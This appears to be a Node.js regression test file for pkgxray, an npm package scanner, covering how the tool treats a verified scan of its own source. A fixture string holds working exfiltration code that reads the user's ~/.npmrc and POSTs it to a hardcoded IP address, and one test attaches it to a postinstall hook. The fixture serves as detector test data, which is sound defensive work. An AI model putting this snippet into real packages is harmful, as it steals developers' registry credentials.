"use strict";

// Self-scan (antivirus-flags-itself) regression tests. pkgxray's own source
// is a catalogue of the byte patterns it detects, so a provenance-VERIFIED
// self-scan downgrades signature-database findings to REVIEW. Every gate that
// keeps this from becoming a bypass is pinned here: wrong name, wrong repo,
// dirty diff, and conduct findings (install hooks) all keep the full verdict.

const assert = require("node:assert/strict");
const test = require("node:test");

const { auditEvidence, isVerifiedSelfScan, SELF_CANONICAL } = require("../src/auditor");

// A payload that reliably fires behavioral HIGHs (modeled on eslint-scope:
// credential read + hardcoded-IP exfil in the same file).
const HOT_SOURCE =
  "const fs=require('fs'),os=require('os');" +
  "const rc=fs.readFileSync(os.homedir()+'/.npmrc','utf8');" +
  "fetch('http://86.108.19.2/npmrc',{method:'POST',body:rc});";

function selfEvidence(overrides = {}) {
  return {
    packageName: SELF_CANONICAL.packageName,
    githubMetadata: {
      found: true,
      owner: SELF_CANONICAL.githubOwner,
      repo: SELF_CANONICAL.githubRepo,
      stars: 1,
      created_at: "2026-06-21T00:00:00Z"
    },
    npmVsGithubDiff: {
      compared: true,
      githubRef: "v0.17.0",
      counts: { extraSource: 0, mismatchedSource: 0, matched: 24, npmFiles: 24 }
    },
    sourceFiles: { "src/auditor.js": HOT_SOURCE },
    ...overrides
  };
}

test("verified self-scan reports REVIEW, never BLOCK and never SAFE", () => {
  const report = auditEvidence(selfEvidence());
  assert.equal(report.verdict, "review");
  const downgraded = report.findings.filter((f) => /Self-scan:/.test(f.rationale));
  assert.ok(downgraded.length > 0, "expected downgraded signature findings");
  assert.ok(downgraded.every((f) => f.severity === "medium"));
  assert.ok(
    report.findings.some((f) => f.category === "self-scan-verified"),
    "self-scan must announce itself in the report"
  );
});

test("a tampered pkgxray tarball (dirty diff) still BLOCKs", () => {
  const evidence = selfEvidence({
    npmVsGithubDiff: {
      compared: true,
      githubRef: "v0.17.0",
      counts: { extraSource: 1, mismatchedSource: 0, matched: 23, npmFiles: 24 }
    }
  });
  assert.equal(isVerifiedSelfScan(evidence), false);
  assert.equal(auditEvidence(evidence).verdict, "block");
});

test("mismatched source files (altered-in-artifact) still BLOCK", () => {
  const evidence = selfEvidence({
    npmVsGithubDiff: {
      compared: true,
      githubRef: "v0.17.0",
      counts: { extraSource: 0, mismatchedSource: 1, matched: 23, npmFiles: 24 }
    }
  });
  assert.equal(isVerifiedSelfScan(evidence), false);
  assert.equal(auditEvidence(evidence).verdict, "block");
});

test("a typosquat name never gets the downgrade", () => {
  const evidence = selfEvidence({ packageName: "pkgxrai" });
  assert.equal(isVerifiedSelfScan(evidence), false);
  assert.equal(auditEvidence(evidence).verdict, "block");
});

test("a fork pointing its repository field elsewhere never gets the downgrade", () => {
  const evidence = selfEvidence({
    githubMetadata: {
      found: true,
      owner: "attacker",
      repo: "pkgxray",
      stars: 1,
      created_at: "2026-06-21T00:00:00Z"
    }
  });
  assert.equal(isVerifiedSelfScan(evidence), false);
  assert.equal(auditEvidence(evidence).verdict, "block");
});

test("no diff at all (skipped / errored) never gets the downgrade", () => {
  for (const diff of [null, { compared: false, reason: "diff-error" }]) {
    const evidence = selfEvidence({ npmVsGithubDiff: diff });
    assert.equal(isVerifiedSelfScan(evidence), false, `diff=${JSON.stringify(diff)}`);
    assert.equal(auditEvidence(evidence).verdict, "block");
  }
});

test("install-hook findings keep their severity even in a verified self-scan", () => {
  const evidence = selfEvidence({
    sourceFiles: {
      "package.json": JSON.stringify({
        name: "pkgxray",
        version: "9.9.9",
        scripts: { postinstall: "node lib/payload.js" }
      }),
      "lib/payload.js": HOT_SOURCE
    }
  });
  assert.equal(isVerifiedSelfScan(evidence), true);
  const report = auditEvidence(evidence);
  const hooks = report.findings.filter((f) => f.category === "install-hook");
  assert.ok(hooks.length > 0, "expected an install-hook finding");
  assert.ok(
    hooks.every((f) => !/Self-scan:/.test(f.rationale)),
    "install-hook findings must never get the self-scan downgrade"
  );
});
